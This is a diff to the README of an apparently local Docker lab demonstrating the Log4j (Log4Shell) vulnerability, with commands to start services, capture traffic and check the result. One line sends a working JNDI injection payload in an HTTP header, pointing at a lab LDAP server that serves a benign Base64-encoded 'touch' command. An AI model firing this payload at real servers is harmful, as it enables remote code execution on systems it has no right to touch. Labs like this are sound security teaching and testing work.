@@ -56,21 +56,37 @@ __Commands__
 ```shell
 # start all services
 $> docker compose up
+
 # stop all services
 $> docker compose down
+
 # clean up all Docker artifacts (including stop all services)
 $> ./scripts/cleanup.sh
+
 # test the Docker services and network
 $> ./scripts/test.sh
+
 # test if exploit has been successful
 $> docker compose exec vulnapp ls -l /tmp
+
 # run interactive shell on tools image container
-$> docker run --name tools --network example_log4j -it tools
+$> docker run --name tools --network example_log4j -it --privileged tools
+
 # inside tools container
 $> curl vulnapp:8080 -H 'X-Api-Version: ${jndi:ldap://log4jldapserver:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9DeWdlbnRhRGVtbw==}'
-$> tcpdump -i eth0 -w /tmp/dump.log &
+
+# install tcpdump on service container (Alpine)
+$> docker compose exec <srvcname> apk add tcpdump
+
+
 # extract log from contanier
-$> docker cp tools:/tmp/dump.log .
+$> docker compose cp <srvcname>:/tmp/dump.log .
+
+# get interactive shell on srvc container
+$> docker compose exec <srvcname> sh
+
+# run tcpdump in container
+$> tcpdump -i eth0 -w /tmp/dump.cap &
 ```
 
 ## Notes
